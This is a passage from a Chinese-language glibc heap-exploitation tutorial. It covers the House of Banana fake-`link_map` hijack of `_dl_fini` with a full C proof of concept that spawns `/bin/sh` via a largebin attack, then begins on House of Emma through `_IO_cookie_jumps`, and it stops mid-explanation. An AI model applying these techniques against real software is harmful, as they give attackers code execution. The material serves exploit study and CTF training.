
```cpp
void
_dl_fini (void)
{
[...]
/* Is there a destructor function? */
if (l->l_info[DT_FINI_ARRAY] != NULL
|| l->l_info[DT_FINI] != NULL)
{
/* When debugging print a message first. */
if (__builtin_expect (GLRO(dl_debug_mask)
& DL_DEBUG_IMPCALLS, 0))
_dl_debug_printf ("\ncalling fini: %s [%lu]\n\n", DSO_FILENAME (l->l_name), ns);
/* First see whether an array is given. */
if (l->l_info[DT_FINI_ARRAY] != NULL)
{
ElfW(Addr) *array =
(ElfW(Addr) *) (l->l_addr
+ l->l_info[DT_FINI_ARRAY]->d_un.d_ptr);
unsigned int i = (l->l_info[DT_FINI_ARRAYSZ]->d_un.d_val
/ sizeof (ElfW(Addr)));
while (i-- > 0)
((fini_t) array[i]) ();
}
...
}
```

## 控制 `array` 和 `i`

在 `fake+0x110` 写入的内容会直接控制 `array`，在 `fake+0x120` 写入的内容会控制 `i`，只要把 `fake+0x120`、`fake+0x110` 控制好，就可以控制最后的 `((fini_t) array[i]) ();`

```cpp
struct link_map
{
[...]
/* Indexed pointers to dynamic section.
[0,DT_NUM) are indexed by the processor-independent tags.
[DT_NUM,DT_NUM+DT_THISPROCNUM) are indexed by the tag minus DT_LOPROC.
[DT_NUM+DT_THISPROCNUM,DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM) are
indexed by DT_VERSIONTAGIDX(tagvalue).
[DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM,
DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM) are indexed by
DT_EXTRATAGIDX(tagvalue).
[DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM,
DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM+DT_VALNUM) are
indexed by DT_VALTAGIDX(tagvalue) and
[DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM+DT_VALNUM,
DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM+DT_VALNUM+DT_ADDRNUM)
are indexed by DT_ADDRTAGIDX(tagvalue), see <elf.h>. */
ElfW(Dyn) *l_info[DT_NUM + DT_THISPROCNUM + DT_VERSIONTAGNUM
+ DT_EXTRANUM + DT_VALNUM + DT_ADDRNUM];
[...]
}
typedef struct
{
Elf64_Sxword d_tag; /* Dynamic entry type */
union
{
Elf64_Xword d_val; /* Integer value */
Elf64_Addr d_ptr; /* Address value */
} d_un;
} Elf64_Dyn;
```

```cpp
void
_dl_fini (void)
{
[...]
if (l->l_info[DT_FINI_ARRAY] != NULL)
{
ElfW(Addr) *array =
(ElfW(Addr) *) (l->l_addr
+ l->l_info[DT_FINI_ARRAY]->d_un.d_ptr);
unsigned int i = (l->l_info[DT_FINI_ARRAYSZ]->d_un.d_val
/ sizeof (ElfW(Addr)));
while (i-- > 0)
((fini_t) array[i]) ();
}
/* Next try the old-style destructor. */
if (l->l_info[DT_FINI] != NULL)
DL_CALL_DT_FINI(l, l->l_addr + l->l_info[DT_FINI]->d_un.d_ptr);
}
[...]
}
```

需要在 `fake+0x110` 写入一个 `ptr`，且 `ptr+0x8` 处有 `ptr2`，`ptr2` 处写入的是最后要执行的函数地址；需要在 `fake+0x120` 写入一个 `ptr`，且 `ptr+0x8` 处是 `i*8`。

例如，`fake+0x110` 写入 `fake+0x40`，在 `fake+0x48` 写入 `fake+0x58`，在 `fake+0x58` 写入 `shell`，在 `fake+0x120` 写入 `fake+0x48`，在 `fake+0x50` 处写入 `8`。

## [POC](elink@f03K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9h3I4W2M7#2)9J5k6r3!0F1k6g2)9J5k6h3N6A6N6r3S2#2j5W2)9J5k6h3W2G2i4K6u0r3x3U0l9J5x3g2)9J5c8U0p5H3i4K6u0r3x3o6c8Q4x3V1k6Z5L8%4g2K6k6g2)9J5k6r3!0X3i4K6u0V1i4K6t1#2c8e0N6Q4x3U0g2n7x3#2)9J5y4f1u0n7i4K6t1#2c8e0g2Q4x3U0f1^5z5q4)9J5y4e0V1%4i4K6t1#2c8e0k6Q4x3U0g2n7b7g2)9J5y4e0V1H3i4K6t1#2c8e0N6Q4x3U0g2m8x3q4)9J5y4e0R3I4i4K6t1#2c8e0g2Q4x3U0f1^5z5q4)9J5y4e0R3$3i4K6t1#2c8e0k6Q4x3U0f1&6c8g2)9J5y4e0V1H3i4K6u0r3">POC</a>】

```cpp
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <assert.h>

void shell()
{
system("/bin/sh");
}

uint64_t getLibcBase()
{
uint64_t to;
uint64_t from;
char buf[0x400];
FILE* file;
sprintf(buf, "/proc/%d/maps", (int)getpid());
file = fopen(buf, "r");
while (fgets(buf, sizeof(buf), file))
{
if (strstr(buf, "libc") != NULL)
{
sscanf(buf, "%lx-%lx", &from, &to);
fclose(file);
return from;
}
}
}

int main()
{
setvbuf(stdin, NULL, _IONBF, 0);
setvbuf(stdout, NULL, _IONBF, 0);
setvbuf(stderr, NULL, _IONBF, 0);

uint64_t libcBase = getLibcBase();
// ldBase + 0x2e060
/*
 * rtld_global_ptr 与 libc_base 的偏移在本地与远程并不是固定的，可能会在地址的第 2 字节处发生变化，因此可以爆破 256 种可能得
 * 到远程环境的精确偏移
 */
uint64_t rtld_global = libcBase + 0x23b060;

// distance &_rtld_global &(_rtld_global._dl_ns._ns_loaded->l_next->l_next->l_next)
uint64_t* next_node = (uint64_t*)(rtld_global - 0x49048);
uint64_t *p1 = malloc(0x428);
uint64_t *g1 = malloc(0x18);
uint64_t *p2 = malloc(0x418);
uint64_t *g2 = malloc(0x18);
uint64_t fake = (uint64_t)p2 - 0x10;

*(uint64_t*)(fake + 0x28) = fake;
*(uint64_t*)(fake + 0x31c) = 0x1c;
*(uint64_t*)(fake + 0x110) = fake + 0x40;
*(uint64_t*)(fake + 0x48) = fake + 0x58;
*(uint64_t*)(fake + 0x58) = (uint64_t)shell;
*(uint64_t*)(fake + 0x120) = fake + 0x48;
*(uint64_t*)(fake + 0x50) = 0x8;

free(p1);
uint64_t *g3 = malloc(0x438); // force p1 insert in to the largebin
free(p2);
p1[3] = ((uint64_t)next_node - 0x20); // push p2 into unsoteded bin
uint64_t *g4 = malloc(0x438); // force p2 insert in to the largebin
p2[1] = 0;
p2[3] = fake;
return 0;
}
```

# House of Emma

`glibc > 2.23`。

## 原理

在 `vtable` 段中存在一个 `_IO_cookie_jumps`：

```cpp
static const struct _IO_jump_t _IO_cookie_jumps libio_vtable = {
JUMP_INIT_DUMMY,
JUMP_INIT(finish, _IO_file_finish),
JUMP_INIT(overflow, _IO_file_overflow),
JUMP_INIT(underflow, _IO_file_underflow),
JUMP_INIT(uflow, _IO_default_uflow),
JUMP_INIT(pbackfail, _IO_default_pbackfail),
JUMP_INIT(xsputn, _IO_file_xsputn),
JUMP_INIT(xsgetn, _IO_default_xsgetn),
JUMP_INIT(seekoff, _IO_cookie_seekoff),
JUMP_INIT(seekpos, _IO_default_seekpos),
JUMP_INIT(setbuf, _IO_file_setbuf),
JUMP_INIT(sync, _IO_file_sync),
JUMP_INIT(doallocate, _IO_file_doallocate),
JUMP_INIT(read, _IO_cookie_read),
JUMP_INIT(write, _IO_cookie_write),
JUMP_INIT(seek, _IO_cookie_seek),
JUMP_INIT(close, _IO_cookie_close),
JUMP_INIT(stat, _IO_default_stat),
JUMP_INIT(showmanyc, _IO_default_showmanyc),
JUMP_INIT(imbue, _IO_default_imbue),
};
```

`_IO_cookie_file` 有如下定义：

```cpp
/* Special file type for fopencookie function. */
struct _IO_cookie_file
{
struct _IO_FILE_plus __fp;
void *__cookie;
cookie_io_functions_t __io_functions;
};

typedef struct _IO_cookie_io_functions_t
{
cookie_read_function_t *read; /* Read bytes. */
cookie_write_function_t *write; /* Write bytes. */
cookie_seek_function_t *seek; /* Seek/tell file position. */
cookie_close_function_t *close; /* Close file. */
} cookie_io_functions_t;
```

其中的函数定义如下：

```cpp
static _IO_ssize_t
_IO_cookie_read (_IO_FILE *fp, void *buf, _IO_ssize_t size)
{
struct _IO_cookie_file *cfile = (struct _IO_cookie_file *) fp;
cookie_read_function_t *read_cb = cfile->__io_functions.read;
#ifdef PTR_DEMANGLE
PTR_DEMANGLE (read_cb);
#endif
if (read_cb == NULL)
return -1;
return read_cb (cfile->__cookie, buf, size);
}

static _IO_ssize_t
_IO_cookie_write (_IO_FILE *fp, const void *buf, _IO_ssize_t size)
{
struct _IO_cookie_file *cfile = (struct _IO_cookie_file *) fp;
cookie_write_function_t *write_cb = cfile->__io_functions.write;
#ifdef PTR_DEMANGLE
PTR_DEMANGLE (write_cb);
#endif
if (write_cb == NULL)
{
fp->_flags |= _IO_ERR_SEEN;
return 0;
}
_IO_ssize_t n = write_cb (cfile->__cookie, buf, size);
if (n < size)
fp->_flags |= _IO_ERR_SEEN;
return n;
}

static _IO_off64_t
_IO_cookie_seek (_IO_FILE *fp, _IO_off64_t offset, int dir)
{
struct _IO_cookie_file *cfile = (struct _IO_cookie_file *) fp;
cookie_seek_function_t *seek_cb = cfile->__io_functions.seek;
#ifdef PTR_DEMANGLE
PTR_DEMANGLE (seek_cb);
#endif
return ((seek_cb == NULL
|| (seek_cb (cfile->__cookie, &offset, dir)
== -1)
|| offset == (_IO_off64_t) -1)
? _IO_pos_BAD : offset);
}

static int
_IO_cookie_close (_IO_FILE *fp)
{
struct _IO_cookie_file *cfile = (struct _IO_cookie_file *) fp;
cookie_close_function_t *close_cb = cfile->__io_functions.close;
#ifdef PTR_DEMANGLE
PTR_DEMANGLE (close_cb);
#endif
if (close_cb == NULL)
return 0;
return close_cb (cfile->__cookie);
}
```

可以看到上面代码的函数调用前都被 `PTR_DEMANGLE` 加密了，其定义如下：
